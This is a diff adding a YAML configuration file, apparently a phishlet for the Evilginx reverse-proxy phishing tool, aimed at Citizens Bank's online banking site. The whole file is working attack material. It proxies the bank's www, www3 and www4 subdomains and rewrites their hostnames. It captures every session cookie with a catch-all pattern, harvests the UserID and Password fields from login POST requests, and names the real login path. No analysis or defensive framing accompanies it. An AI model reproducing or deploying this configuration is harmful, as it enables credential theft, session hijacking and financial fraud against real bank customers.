@@ -1,0 +1,70 @@
+author: 'your boy'
+min_ver: '2.3.0'
+
+proxy_hosts:
+  - { phish_sub: 'www', orig_sub: 'www', domain: 'citizensbankonline.com', session: true, is_landing: true }
+  - { phish_sub: 'www3', orig_sub: 'www3', domain: 'citizensbankonline.com', session: true, is_landing: true }
+  - { phish_sub: 'www4', orig_sub: 'www4', domain: 'citizensbankonline.com', session: true, is_landing: true }
+
+
+sub_filters:
+  - { triggers_on: 'www.citizensbankonline.com', orig_sub: '', domain: 'citizensbankonline.com', search: 'https://www.{domain}/', replace: 'https://www.{domain}/', mimes: [ 'text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript' ] }
+  - { triggers_on: 'www.citizensbankonline.com', orig_sub: '', domain: 'citizensbankonline.com', search: 'www.{domain}', replace: 'www.{domain}', mimes: [ 'text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript' ] }
+  - { triggers_on: 'www.citizensbankonline.com', orig_sub: 'www', domain: 'citizensbankonline.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: [ 'text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript' ] }
+  - { triggers_on: 'www.citizensbankonline.com', orig_sub: 'www', domain: 'citizensbankonline.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: [ 'text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript' ] }
+  - { triggers_on: 'www.citizensbankonline.com', orig_sub: '', domain: 'citizensbankonline.com', search: 'https://{domain}/', replace: 'https://{domain}/', mimes: [ 'text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript' ] }
+  - { triggers_on: 'www.citizensbankonline.com', orig_sub: '', domain: 'citizensbankonline.com', search: '{domain}', replace: '{domain}', mimes: [ 'text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript' ] }
+  - { triggers_on: 'www.citizensbankonline.com', orig_sub: 'www', domain: 'citizensbankonline.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: [ 'text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript' ] }
+  - { triggers_on: 'www.citizensbankonline.com', orig_sub: 'www', domain: 'citizensbankonline.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: [ 'text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript' ] }
+
+  - { triggers_on: 'www3.citizensbankonline.com', orig_sub: '', domain: 'citizensbankonline.com', search: 'https://www3.{domain}/', replace: 'https://www3.{domain}/', mimes: [ 'text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript' ] }
+  - { triggers_on: 'www3.citizensbankonline.com', orig_sub: '', domain: 'citizensbankonline.com', search: 'www3.{domain}', replace: 'www3.{domain}', mimes: [ 'text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript' ] }
+  - { triggers_on: 'www3.citizensbankonline.com', orig_sub: 'www3', domain: 'citizensbankonline.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: [ 'text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript' ] }
+  - { triggers_on: 'www3.citizensbankonline.com', orig_sub: 'www3', domain: 'citizensbankonline.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: [ 'text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript' ] }
+  - { triggers_on: 'www3.citizensbankonline.com', orig_sub: '', domain: 'citizensbankonline.com', search: 'https://{domain}/', replace: 'https://{domain}/', mimes: [ 'text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript' ] }
+  - { triggers_on: 'www3.citizensbankonline.com', orig_sub: '', domain: 'citizensbankonline.com', search: '{domain}', replace: '{domain}', mimes: [ 'text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript' ] }
+  - { triggers_on: 'www3.citizensbankonline.com', orig_sub: 'www3', domain: 'citizensbankonline.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: [ 'text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript' ] }
+  - { triggers_on: 'www3.citizensbankonline.com', orig_sub: 'www3', domain: 'citizensbankonline.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: [ 'text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript' ] }
+
+  - { triggers_on: 'www4.citizensbankonline.com', orig_sub: '', domain: 'citizensbankonline.com', search: 'https://www4.{domain}/', replace: 'https://www4.{domain}/', mimes: [ 'text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript' ] }
+  - { triggers_on: 'www4.citizensbankonline.com', orig_sub: '', domain: 'citizensbankonline.com', search: 'www4.{domain}', replace: 'www4.{domain}', mimes: [ 'text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript' ] }
+  - { triggers_on: 'www4.citizensbankonline.com', orig_sub: 'www4', domain: 'citizensbankonline.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: [ 'text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript' ] }
+  - { triggers_on: 'www4.citizensbankonline.com', orig_sub: 'www4', domain: 'citizensbankonline.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: [ 'text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript' ] }
+  - { triggers_on: 'www4.citizensbankonline.com', orig_sub: '', domain: 'citizensbankonline.com', search: 'https://{domain}/', replace: 'https://{domain}/', mimes: [ 'text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript' ] }
+  - { triggers_on: 'www4.citizensbankonline.com', orig_sub: '', domain: 'citizensbankonline.com', search: '{domain}', replace: '{domain}', mimes: [ 'text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript' ] }
+  - { triggers_on: 'www4.citizensbankonline.com', orig_sub: 'www4', domain: 'citizensbankonline.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: [ 'text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript' ] }
+  - { triggers_on: 'www4.citizensbankonline.com', orig_sub: 'www4', domain: 'citizensbankonline.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: [ 'text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript' ] }
+
+auth_tokens:
+  - domain: '.citizensbankonline.com'
+    keys: ['.*,regexp']
+  - domain: 'www.citizensbankonline.com'
+    keys: ['.*,regexp']
+  - domain: 'www3.citizensbankonline.com'
+    keys: ['.*,regexp']
+  - domain: 'www4.citizensbankonline.com'
+    keys: ['.*,regexp']
+
+credentials:
+  username:
+    key: 'UserID'
+    search: '(.*)'
+    type: 'post'
+
+  password:
+    key: 'Password'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'www3.citizensbankonline.com'
+  path: '/efs/servlet/efs/login.jsp'
+
+force_post:
+  - path: '/efs/servlet/efs/wait.jsp?target=loginnew-wait.jsp'
+    search:
+      - { key: 'UserID', search: '.*' }
+      - { key: 'Password', search: '.*' }
+    force:
+      - { key: 'cbSaveUserID', value: 'on' }
+    type: 'post'
